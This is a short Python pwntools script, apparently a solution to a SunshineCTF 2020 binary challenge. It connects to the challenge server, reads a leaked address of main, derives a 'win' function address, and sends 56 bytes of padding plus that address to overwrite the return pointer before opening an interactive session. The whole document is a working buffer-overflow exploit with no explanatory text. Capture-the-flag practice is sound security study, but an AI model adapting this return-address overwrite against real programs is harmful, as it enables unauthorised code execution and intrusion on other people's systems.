from pwn import *
from Crypto.Util.number import *
from binascii import hexlify, unhexlify
# context.log_level = 'debug'
r = remote('chal.2020.sunshinectf.org', 30005)
# r = process('chall_05')
r.recvuntil(b'\n')
r.sendline(b'a')
d = r.recvuntil(b'\n').strip().split(b' ')
main = int(d[-1], 16)
print(hex(main))
win = long_to_bytes(main-19)[::-1]
print(hexlify(win))
r.sendline(b'a'*56 + win + b'\x00\x00')
r.interactive()
r.close()
